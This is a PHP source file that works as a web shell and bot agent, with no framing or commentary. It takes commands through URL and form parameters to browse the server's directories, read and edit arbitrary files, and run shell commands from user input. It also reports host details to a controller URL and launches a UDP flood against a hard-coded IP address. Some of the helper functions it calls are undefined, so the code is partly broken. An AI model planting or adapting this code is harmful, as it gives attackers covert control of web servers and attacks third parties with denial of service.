<?php
error_reporting(0);
ignore_user_abort(TRUE);
set_time_limit(0);

    function getPathFiles($path ){
    if(!isset($path)) $path = $_SERVER['DOCUMENT_ROOT'];
    if(!is_dir($path)){ return false ;}
    else{
        $Myfiles = array();
        $Myfiles["name"] = realpath($path );
        $Myfiles["files"] = array();
        $dirFiles = array();
        $files = scandir($path);
        foreach ($files as $file) {
            if($file ==="." || $file === ".."){

            }
            else {
            $fileDetails = array();
            $fileDetails["name"] = $file ;
            $fileDetails["size"] = formatSizeUnits(filesize($path."/".$file)) ;
            $fileDetails["perm"] = substr(sprintf("%o", fileperms($Myfiles["name"]."/".$file )), -4);
            if(is_dir($path."/".$file)){
                $fileDetails["type"] = 1 ;
            }else {
                $fileDetails["type"] = 0 ;

            }
            $fileDetails["mtime"] = date ("Y-m-d H:i:s", filemtime($Myfiles["name"]."/".$file ));
            $fileDetails["read"] = is_readable($Myfiles["name"]."/".$file);
            array_push($dirFiles, $fileDetails);

            }
            


        }
        $Myfiles["files"] = $dirFiles ;
        return $Myfiles  ;
    }

}


function sendDeclaration(){
    global $_SERVER ;
    $pageName = basename($_SERVER['SCRIPT_NAME']);
}

function ddos($ip , $port = 80 , $time , $type='TCP' , $size = 1000 ){

    $startTime = time();
    $packet  = str_repeat("7", $size );
    $ip= "udp://".$ip; 
    while((time() - $startTime  ) < $time){

        $fp = fsockopen ($ip,  $port , $errno, $errstr, 30);
        fwrite($fp, $packet); 

    }
    return true ;

}
function binToBolean($value){
    if($value==='1')return true ;
    else {
        return false ;
    }
}

function getFileContent($path){
    return @file_get_contents($path);
}
function sendToMaster($data){
    GLOBAL $MASTERLINK ;
    $content = json_encode($data);
    $curl = curl_init($MASTERLINK);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER,array("Content-type: application/json"));
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
    $response = curl_exec($curl);   
    curl_close($ch);
    return $response; 
}
function getDomaineDetails (){
    global $_SERVER;
    $details =  array();

    if(strlen($_SERVER['HTTP_HOST']) != 0)$domaine =  $_SERVER['HTTP_HOST'];
    else $domaine = $_SERVER['SERVER_NAME'] ;

    if(strlen($_SERVER['SERVER_ADDR']) != 0)$ip =  $_SERVER['SERVER_ADDR'];
    else{
        $host= gethostname();
        $ip = gethostbyname($host);
    }

    $details['name'] = $domaine ;
    $details['ip'] = $ip ;
    $details['cn'] = getCn()  ;
    $details['os'] = getServerOs();
    $kv = explode(' ',php_uname('v')) ;
    $kv = $kv[count($kv)-1];
    $details['kernel'] = substr($kv, 0,5);
    $details['phpversion'] = PHP_VERSION;
    $details['socket'] = function_exists('fsockopen');
    $details['speed'] = testSpeed('http://www.w3schools.com');
    $details['cmd'] = (strlen(shellexec("ls"))+strlen(shellexec("DIR"))>0);
    $details['eval'] = function_exists('fsockopen'); 
    return $details;
}

function testSpeed($url = "http://www.w3schools.com"){
clearstatcache();
$time_start = microtime(true);
$data =  @file_get_contents_curl($url);
$end = microtime(true) - $time_start;
$Mbytes = strlen($data)*8/1000000 ;
$SPEED = number_format($Mbytes/$end , 2 );
return $SPEED ;

}

$action = $_GET['action'] ;
if($action === 'getFiles'){

	$path = "./";
	if(isset($_POST['path']))$path = $_POST['path'] ;
	echo json_encode(getPathFiles($path));
}
else if($action === 'Details'){
	echo json_encode(getDomaineDetails());
}
else if($action === 'getFileContent'){
    echo getFileContent($_POST['path']);
}
else if($action === 'doCmd'){
    echo shellexec($_POST['cmd']);
}
else if($action === 'editFile'){
   echo editFile($_POST['path']  ,$_POST['contenu'] );
}
else if($action === 'ddos'){

    ddos( "41.250.177.102" , 80 , 10000 );
}


?>
